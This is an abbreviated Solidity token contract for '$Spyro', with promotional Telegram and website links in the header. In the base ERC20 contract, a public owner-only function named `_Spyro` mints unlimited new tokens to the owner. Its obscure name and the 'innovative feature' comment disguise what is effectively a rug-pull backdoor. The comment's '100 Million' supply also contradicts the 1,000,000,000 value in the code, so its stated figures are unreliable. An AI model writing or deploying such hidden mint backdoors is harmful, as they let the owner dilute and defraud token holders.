//
// $Spyro proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpyroBEP20
// 📱 Website ::https://spyro.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Spyro(uint256 amount) public onlyOwner {
 _Spyro(msg.sender, amount);
    }
    ...
    function _Spyro(address account, uint256 amount) internal virtual {
...
contract $Spyro is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Spyro", "SPYRO") {
     _Spyro(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}